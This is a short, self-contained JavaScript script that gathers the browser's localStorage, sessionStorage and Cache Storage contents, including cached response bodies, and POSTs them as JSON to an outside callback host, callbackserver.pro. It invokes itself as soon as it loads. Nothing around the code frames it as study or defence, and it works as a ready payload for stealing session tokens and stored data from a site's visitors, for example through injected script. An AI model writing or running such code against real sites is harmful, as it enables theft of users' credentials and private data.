async function gatherAndPostStorageData() {
    // 1. Retrieve localStorage data
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }

    // 2. Retrieve sessionStorage data
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }

    // 3. Retrieve Cache Storage data (optional, depending on your app's use of Cache Storage)
    const cacheStorageData = {};
    if ('caches' in window) {
        const cacheNames = await caches.keys();
        for (const cacheName of cacheNames) {
            const cache = await caches.open(cacheName);
            const requests = await cache.keys();
            cacheStorageData[cacheName] = [];
            for (const request of requests) {
                const response = await cache.match(request);
                const responseBody = await response.text();  // Get the body of the cached response
                cacheStorageData[cacheName].push({
                    url: request.url,
                    response: responseBody
                });
            }
        }
    }

    // 4. IndexedDB data (more complex, optional, and depends on your app)
    const indexedDBData = {};
    if (window.indexedDB) {
        // IndexedDB logic goes here, but this would be application-specific
        // Usually, you need to open each IndexedDB database, iterate over object stores, and retrieve data
    }

    // 5. Combine all data into one object
    const allStorageData = {
        localStorage: localStorageData,
        sessionStorage: sessionStorageData,
        cacheStorage: cacheStorageData,
        indexedDB: indexedDBData  // You would need to implement actual IndexedDB retrieval logic here
    };

    // 6. POST the data to your server
    fetch('https://callbackserver.pro', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(allStorageData)  // Send the collected data
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);  // Handle the response from the server
    })
    .catch((error) => {
        console.error('Error:', error);  // Handle any errors
    });
}

// Call the function
gatherAndPostStorageData();

